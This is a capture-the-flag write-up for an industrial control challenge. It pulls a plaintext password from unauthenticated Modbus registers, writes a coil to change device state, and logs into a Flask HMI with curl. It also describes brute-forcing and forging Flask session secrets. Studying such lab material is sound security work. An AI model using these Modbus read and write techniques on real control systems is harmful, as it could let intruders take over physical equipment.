# Radiated — CTF Writeup

## Challenge Overview

**Scenario:** The factory's radiation control system has been compromised, rapidly increasing the radiation. We need to reconfigure the devices and enable the monitoring systems, but we cannot locate the system administration that controls the HMI and has the necessary credentials. Can you somehow find them in the system's network and rectify the situation?

**Target:** Two ports — a Modbus TCP service and a Flask/Werkzeug web application (Gamma Monitoring Panel)

**Files provided:** `client.py` — a Modbus TCP client template using `umodbus`

## Flag

```
HTB{m0d8u5_h45_n0_53cu217y!!}
```

## Summary

- **Access & Environment:** Modbus TCP service with no authentication exposing credentials in holding registers; Flask web HMI with a hidden authentication form
- **Critical Findings:** Password `94mm453cu23d` stored as ASCII in Modbus holding registers 15-26; hidden form field `unlock_code` on `/access` page
- **Security Implications:** Modbus TCP has no authentication — credentials stored in plain text in registers are trivially extractable by any network participant

## Information Gathering

### Port Discovery

Two target ports were provided:
- **Modbus TCP service** — raw Modbus protocol (no HTTP)
- **Web application** — Flask/Werkzeug 2.2.3 Python/3.10.6 (Gamma Monitoring Panel)

### Web Application Enumeration

The Gamma Monitoring Panel has the following endpoints:
- `/` — Main page with LCD display showing `0000000000`
- `/access` — Enable Radiation Control (shows `AUTH_ERR` or `ENROLL_ERR`)
- `/state` — Gamma Systems State (shows `DEVICES_ON`)
- `/provision` — Provision (shows `SUCCESS`)
- `/power` — Start/Stop Controller (shows `ERROR`)
- `/rate` — Radiation dose rate (returns 500 when unauthenticated)

**Critical discovery:** The `/access` page contains a hidden HTML form:
```html
<form action="/access" method="POST">
PassCode: <input type="text" name="unlock_code"/>
<input type="submit" value="Authorize"/>
</form>
```

The form field name is `unlock_code` — not `password`, `key`, or any common field name.

### Modbus Enumeration

**Coils (FC1):** 10 coils at addresses 1-10, initial state `[0, 1, 1, 0, 0, 1, 1, 0, 0, 0]`

**Holding Registers (FC3):** Readable at addresses 1-26:
- Registers 1-14: Binary coil state values (0s and 1s)
- Registers 15-26: ASCII-encoded password: `94mm453cu23d`

The holding registers at addresses 15-26 contain the ASCII values:
```
57('9') 52('4') 109('m') 109('m') 52('4') 53('5') 51('3') 99('c') 117('u') 50('2') 51('3') 100('d')
```

## Exploitation

### Stage 1: Extract Password from Modbus Registers

**Code:**
```python
import socket, struct

HOST = 'TARGET_IP'
MODBUS_PORT = 32540

# Read holding registers 15-26 (the password)
pdu = struct.pack('>BHH', 3, 15, 12)  # FC3, start=15, count=12
packet = struct.pack('>HHHB', 1, 0, len(pdu)+1, 1) + pdu

sock = socket.socket()
sock.connect((HOST, MODBUS_PORT))
sock.sendall(packet)
response = sock.recv(4096)
sock.close()

# Extract ASCII values from response
raw = response[9:9+response[8]]
password = ''.join(chr(int.from_bytes(raw[i:i+2], 'big')) for i in range(0, len(raw), 2))
print(f"Password: {password}")  # 94mm453cu23d
```

**Output:**
```
Password: 94mm453cu23d
```

**Description:** Modbus function code 3 (Read Holding Registers) is used to read registers at addresses 15-26. Each 16-bit register contains an ASCII character code. No authentication is required for Modbus TCP.

**Security Implications:** Critical — Modbus TCP has no authentication mechanism. Any network participant can read all register data, including credentials stored in plain text.

### Stage 2: Enroll the Device (Write Coil 1)

**Code:**
```python
pdu = struct.pack('>BHH', 5, 1, 0xFF00)  # FC5, coil 1, ON
packet = struct.pack('>HHHB', 1, 0, len(pdu)+1, 1) + pdu
sock.sendall(packet)
sock.recv(256)
```

**Description:** Writing coil 1 to ON triggers the enrollment process. The LCD changes from `ENROLL_ERR` to `AUTH_ERR`, indicating the device is now waiting for authentication.

### Stage 3: Authenticate via POST /access with unlock_code

**Code:**
```bash
curl -s -X POST -d 'unlock_code=94mm453cu23d' http://TARGET:WEB_PORT/access -c cookies.txt
```

**Output:**
```
LCD: ENABLED
Set-Cookie: session=eyJncm...granted...true...; HttpOnly; Path=/
```

**Description:** The password extracted from Modbus registers is submitted as the `unlock_code` form field. The server responds with LCD=`ENABLED` and sets a new session cookie with `granted:true`.

**Security Implications:** Critical — The authentication credential is stored in an unauthenticated Modbus device and can be used to gain full control of the radiation monitoring HMI.

### Stage 4: Read the Flag

**Code:**
```bash
curl -s -b cookies.txt http://TARGET:WEB_PORT/rate
```

**Output:**
```
Gamma Dose Rate : 0.02103445610 uR/hr
HTB{m0d8u5_h45_n0_53cu217y!!}
```

**Description:** With the authenticated session cookie, the `/rate` endpoint returns the radiation dose rate (now normalized to a safe level) and the flag.

## How We Solved It — Reasoning

### Initial Approach

We initially focused on the Flask session cookie (`{"granted":false}`) and attempted to:
1. Brute-force the Flask secret key using flask-unsign with 8.5M+ passwords (rockyou.txt)
2. Forge sessions using itsdangerous with various salts and key derivations
3. Try the Modbus-extracted password as the Flask secret

All of these failed because the password was NOT the Flask session secret — it was an authentication credential for the web form.

### Key Insight

The breakthrough came from going back to basics and carefully reading the FULL HTML response of the `/access` endpoint. Buried in the page was an HTML form with a non-obvious field name (`unlock_code`). We had previously tried POSTing with field names like `password`, `key`, `token`, `credential`, etc. — but never `unlock_code`.

### Rejected Hypotheses

1. ❌ The Modbus password IS the Flask session secret (verified: HMAC signatures don't match with any hash algorithm or key derivation)
2. ❌ The flag is hidden in Modbus register data (only the password was there)
3. ❌ The flag appears after specific coil patterns (no pattern produced it)
4. ❌ Flask session can be forged with empty/trivial secrets (all rejected)
5. ❌ The password works as Basic auth, Digest auth, or custom cookie (all return AUTH_ERR)
6. ✅ The password authenticates via the hidden `unlock_code` form field on `/access`

### Evidence Correlation

- Modbus registers 15-26 → ASCII `94mm453cu23d` (the "system administration credentials" mentioned in the scenario)
- POST `/access` with `unlock_code=94mm453cu23d` → LCD=`ENABLED`, session cookie set with `granted:true`
- GET `/rate` with authenticated session → radiation rate normalized to 0.02 uR/hr + flag displayed

### Lessons Learned

1. **Read the full HTML** — Hidden form fields can be easily missed when focusing on JavaScript-rendered content (the LCD display)
2. **Modbus has no security** — The flag name says it all: `m0d8u5_h45_n0_53cu217y` (Modbus has no security)
3. **Don't overthink** — After exhausting complex approaches (session forgery, brute force), going back to basics revealed the simple solution
